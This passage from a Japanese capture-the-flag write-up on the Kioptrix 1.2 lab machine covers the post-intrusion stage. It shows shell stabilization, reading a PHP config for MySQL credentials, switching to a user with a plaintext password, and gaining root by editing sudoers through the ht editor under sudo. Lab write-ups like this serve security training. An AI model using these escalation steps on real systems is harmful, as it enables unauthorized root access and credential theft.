## 侵入後
シェルの安定化を行い、ディレクトリを探してみるとgalleryがあったので中を確認してみたところ、configがあったので確認してみたところMySQLへの接続情報を見つけました。
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo;fg
cd gallery
cat gconfig.php
```
[![CMS]({{ '/assets/images/writeups/kioptrix1.2/gconfig.png' | relative_url }})]({{ '/assets/images/writeups/kioptrix1.2/gconfig.png' | relative_url }})

取得していたユーザーで切り替え
```bash
su loneferret
Password: starwars
```
[![CMS]({{ '/assets/images/writeups/kioptrix1.2/su.png' | relative_url }})]({{ '/assets/images/writeups/kioptrix1.2/su.png' | relative_url }})

その後、htというファイルエディタを見つけたので /bin/bashを編集してroot権限獲得です。
```bash
sudo -l
sudo ht
loneferret ALL=(ALL) ALL
sudo /bin/bash
id
```
[![CMS]({{ '/assets/images/writeups/kioptrix1.2/root.png' | relative_url }})]({{ '/assets/images/writeups/kioptrix1.2/root.png' | relative_url }})
